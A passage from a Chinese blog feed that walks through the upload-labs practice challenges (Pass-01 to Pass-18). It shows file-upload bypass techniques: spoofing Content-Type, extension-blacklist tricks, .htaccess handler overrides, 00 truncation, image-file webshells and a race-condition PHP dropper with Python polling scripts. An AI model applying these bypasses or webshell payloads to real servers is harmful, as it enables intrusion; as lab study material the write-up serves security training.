class="string">&#x27;getPasswd(&quot;&#123;&#125;&quot;)&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">pwd = ctx.<span class="built_in">eval</span>(funcName)</span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20221223151319030.png" alt="image-20221223151319030"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传</title>
      <link href="/posts/44707/"/>
      <url>/posts/44707/</url>
      
        <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p>前端js限制文件上传类型，只需要绕过js即可上传文件</p><ol><li>利用burp的proxy模块，移除所有js文件</li><li>禁用js脚本</li><li>修改前端源码，删除js代码</li></ol><p>直接演示第三种方法，将源码拷贝到新的html文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改源码文件，action选项可以先上传一张正常的图片，查看请求的url</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>= <span class="string">&quot;图片提交地址&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&quot;&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后打开html上传文件即可上传成功。</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>首先了解一下MIME是什么？</p><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。</p><p>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p><p>如：<code>PNG图像 .png image/png</code></p><p>服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用<code>Content-type</code>关键字进行定义。</p><p><code>Content-type: text/html</code></p><p>通过源码发现服务器端只是通过<code>Content-type</code>类型来判断是否是图片文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只需要修改<code>Content-type</code>类型就可以上传webshell</p><p><img src="http://image.jh2ing.com/image-20221122173942960.png" alt="image-20221122173942960"></p><p>修改为<code>Content-Type: image/jpeg</code>，可以发现php.php文件上传成功。</p><p><img src="http://image.jh2ing.com/image-20221122174209548.png" alt="image-20221122174209548"></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p>当apache的配置文件httpd.conf中存在如下配置时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>说明可以通过上传<code>.phtml|.phps|.php5|.pht</code>这些后缀名的文件，且他们都会被解析称后缀为<code>.php</code>的文件。所以可以尝试使用上传<code>xxx.php5</code>这类的文件进行绕过。</p><blockquote><p>注意phpstudy集成环境版本问题，AddType添加不生效解决办法，nts不解析，需要phpts版本。</p><p><code>https://www.cnblogs.com/Article-kelp/p/14927087.html</code></p><p>推荐使用<code>https://github.com/c0ny1/upload-labs/releases</code></p></blockquote><p>使用burp修改文件后缀或者直接重命名文件更改后缀后上传</p><p><img src="http://image.jh2ing.com/image-20221122184924852.png" alt="image-20221122184924852"></p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><blockquote><p>需要注意，.htaccess文件的作用域为其所在目录与其所有的子目录，若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。</p></blockquote><p><code>.htaccess</code>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script .jpg</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">Sethandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><code>Sethandler</code> 将该目录及子目录的所有文件均映射为php文件类型。<br><code>Addhandler</code> 使用 php5-script 处理器来解析所匹配到的文件。<br><code>AddType</code> 将特定扩展名文件映射为php文件类型。</p><p>编辑<code>.htaccess</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>图片马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy init.jpg/b + php.php horse.jpg</span><br></pre></td></tr></table></figure><p>两个文件上传之后，复制图片地址并连接</p><p><img src="http://image.jh2ing.com/image-20221123145853222.png" alt="image-20221123145853222"></p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p>限制了<code>.htaccess</code>文件，没有限制大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>使用burp抓包修改或者直接更改后缀名即可绕过。</p><p><img src="http://image.jh2ing.com/image-20221123150505650.png" alt="image-20221123150505650"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p>查看源码发现没首尾去空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>使用burp添加空格</p><p><img src="http://image.jh2ing.com/image-20230104102233905.png" alt="image-20230104102233905"></p><p>然后成功访问</p><p><img src="http://image.jh2ing.com/image-20221123181138209.png" alt="image-20221123181138209"></p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p>利用Windows特性，没有对文件末尾的点做限制，上传之后Windows会自动去掉点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>使用burp抓包，在文件名后缀上添加<code>.</code></p><p><img src="http://image.jh2ing.com/image-20221123182131697.png" alt="image-20221123182131697"></p><p>然后浏览器访问此路径</p><p><img src="http://image.jh2ing.com/image-20221123182328627.png" alt="image-20221123182328627"></p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p>没有对后缀名进行去<code>::$DATA</code>处理，利用windows特性，可在后缀名中加<code> ::$DATA</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20221124120729264.png" alt="image-20221124120729264"></p><p><img src="http://image.jh2ing.com/image-20221124120629042.png" alt="image-20221124120629042"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure><p>通过源码发现，之前是随机生成文件名拼接文件后缀<code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>，而此处是直接拼接<code>$file_name</code>，只要上传的文件名满足在<code>$file_ext</code>过滤之后不在下面的黑名单里且<code>$file_name</code>是php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>deldot()</code>函数会删除文件名末尾的点，连续的点都会被去除，<code>strrchr()</code>函数会截取文件后缀名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php. .</span><br><span class="line">deldot()之后： test.php. </span><br><span class="line">strrchr()截取后： .</span><br></pre></td></tr></table></figure><p>此时<code>$file_ext = .</code>不在黑名单之内，且<code>$file_name = test.php.   </code>，windows特性会去除最后的<code>.</code>，最后上传之后最终变成<code>/upload/test.php</code></p><p>本地测试</p><p><img src="http://image.jh2ing.com/image-20221124142139096.png" alt="image-20221124142139096"></p><p>使用burp更改后缀</p><p><img src="http://image.jh2ing.com/image-20221124141656276.png" alt="image-20221124141656276"></p><p><img src="http://image.jh2ing.com/image-20221124141841881.png" alt="image-20221124141841881"></p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>将上传的文件名含有黑名单里的关键字全替换为空，使用双写绕过</p><p><img src="http://image.jh2ing.com/image-20221124150608222.png" alt="image-20221124150608222"></p><p>因为文件名也含有php，所以被去掉了</p><p><img src="http://image.jh2ing.com/image-20221124150655440.png" alt="image-20221124150655440"></p><h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;)</span><br></pre></td></tr></table></figure><p>只允许的文件后缀，此处上传目录可控，可采用00截断。</p><p><strong>00截断原理</strong></p><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 上传一个普通文件</span><br><span class="line">/upload/test.txt</span><br><span class="line"># 00截断 %00是0在url编码后的内容</span><br><span class="line">/upload/test.php%00.txt</span><br></pre></td></tr></table></figure><p>白名单会识别到正常的<code>txt</code>后缀，但是操作系统在读取到<code>\0</code>时就会结束，从而变成了<code>/upload/test.php</code>。</p><p>php环境00截断要求：php版本小于5.3.29</p><p><img src="http://image.jh2ing.com/image-20221125153354703.png" alt="image-20221125153354703"></p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p>和Pass-11一样，不过此处使用了POST请求，GET请求可以直接在url上加上<code>%00</code>会自动解码</p><p>拼接上传路径</p><blockquote><p>这是在php后面写1是因为在hex下好快速寻找修改位置</p></blockquote><p><img src="http://image.jh2ing.com/image-20221125154945391.png" alt="image-20221125154945391"></p><p>找到<code>1</code>这个位置</p><p><img src="http://image.jh2ing.com/image-20221125155243166.png" alt="image-20221125155243166"></p><p>修改为<code>00</code></p><p><img src="http://image.jh2ing.com/image-20221125155309625.png" alt="image-20221125155309625"></p><p>上传成功</p><p><img src="http://image.jh2ing.com/image-20221125155349835.png" alt="image-20221125155349835"></p><h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>上传文件会通过读取文件头来判断是什么类型的文件，什么是文件头？每个文件都要一个特定的标识，比如txt文件和jpg文件，系统通过读取文件头来判断此文件属于什么类型。此处有文件包含，可以制作图片马上传。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见的文件头</span><br><span class="line"> JPEG (jpg)，文件头：FFD8FF</span><br><span class="line"> PNG (png)，文件头：89504E47</span><br><span class="line"> GIF (gif)，文件头：47494638</span><br><span class="line"> TIFF (tif)，文件头：49492A00</span><br><span class="line"> Windows Bitmap (bmp)，文件头：424D</span><br></pre></td></tr></table></figure><p>制作图片马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy init.jpg/b + phpinfo.php horse.jpg</span><br></pre></td></tr></table></figure><p>上传图片后利用文件包含漏洞加载图片马</p><p><img src="http://image.jh2ing.com/image-20221125182410432.png" alt="image-20221125182410432"></p><h4 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h4><p>使用 <code>getimagesize()</code>函数来获取文件信息，方法和Pass-13一样</p><h4 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h4><p>使用<code>php_exif模块</code>来检测，也可以和Pass-13一样，原理和检测文件头类似，可以直接在php文件中添加关键字<code>GIF89a</code>,把后缀名修改成gif</p><p><img src="http://image.jh2ing.com/image-20221125184711545.png" alt="image-20221125184711545"></p><p>利用文件包含漏洞访问</p><p><img src="http://image.jh2ing.com/image-20221125184739657.png" alt="image-20221125184739657"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。</p><p><img src="http://image.jh2ing.com/image-20221201141903796.png" alt="image-20221201141903796"></p><p>通过对比上传前后的图片，发现后面的位置已经发生改变，在没有发生改变的位置插入webshell</p><p><img src="http://image.jh2ing.com/image-20221201153843612.png" alt="image-20221201153843612"></p><p>上传成功之后利用文件包含漏洞访问。</p><p><img src="http://image.jh2ing.com/image-20221201153915116.png" alt="image-20221201153915116"></p><p>以下参考其他类型图片</p><blockquote><p><a href="https://xz.aliyun.com/t/2657#toc-1">https://xz.aliyun.com/t/2657#toc-1</a></p></blockquote><h4 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h4><p>主要测试条件竞争，对于非法文件进行了删除操作，服务器对文件的读取和删除包括代码执行都需要时间，在这一小段时间内，文件仍然存在于服务器上，你就可以进行触发等操作。</p><p>编写<code>compete.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;bin.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp抓取上传数据包到intruder模块</p><p><img src="http://image.jh2ing.com/image-20221201160130490.png" alt="image-20221201160130490"></p><p>设置payload</p><p><img src="http://image.jh2ing.com/image-20221201160331159.png" alt="image-20221201160331159"></p><p>设置线程200</p><p><img src="http://image.jh2ing.com/image-20221201160439994.png" alt="image-20221201160439994"></p><p><img src="http://image.jh2ing.com/image-20221201160404927.png" alt="image-20221201160404927"></p><p>然后编写脚本来访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(<span class="string">&quot;http://192.168.73.139/upload/compete.php&quot;</span>)</span><br><span class="line">    code = response.status_code</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><p>多次访问之后发现状态码返回200，说明已经成功执行了php文件</p><p><img src="http://image.jh2ing.com/image-20221201161911017.png" alt="image-20221201161911017"></p><p>直接访问webshell创建的php文件</p><blockquote><p>返回状态码200有时候可能没有创建成功，可以把break删除，或者统计多个来结束</p></blockquote><p><img src="http://image.jh2ing.com/image-20221201162234066.png" alt="image-20221201162234066"></p><h4 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h4><p>同样也是条件竞争，只是限制了php文件上传，上传之后重命名，这里使用图片马上传，在重命名时使用条件竞争的方法。</p><p>制作图片马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + compete.php test01.jpg</span><br></pre></td></tr></table></figure><p>然后按照上面的方法进行，这里注意的是上传路径不在upload里面，一切以环境正常上传路径为主，我正常上传重名后图片的地址为<code>http://192.168.73.139/upload1669884432.jpg</code></p><p>编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(<span class="string">&quot;http://192.168.73.139/include.php?file=uploadtest01.jpg&quot;</span>)</span><br><span class="line">    text = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Warning&quot;</span> <span class="keyword">not</span> <span 